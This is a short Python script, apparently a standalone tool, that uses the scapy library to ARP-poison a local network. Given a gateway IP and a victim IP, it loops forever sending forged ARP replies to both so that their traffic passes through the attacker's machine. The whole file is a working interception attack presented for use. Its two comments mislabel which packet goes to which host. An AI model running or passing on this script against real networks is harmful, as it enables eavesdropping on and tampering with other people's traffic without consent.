import sys
from scapy.all import *

if len(sys.argv) < 3:
  print "usage: sudo ./python arppoison.py gateway_ip victim_ip"
  exit()

gateway = sys.argv[1]
victim = sys.argv[2]

# tell gateway we are the victim
a = ARP(psrc = gateway, pdst = victim)
# tell victim we are the gateway
b = ARP(psrc = victim, pdst = gateway)

# poison
while True:
  send(a)
  send(b)


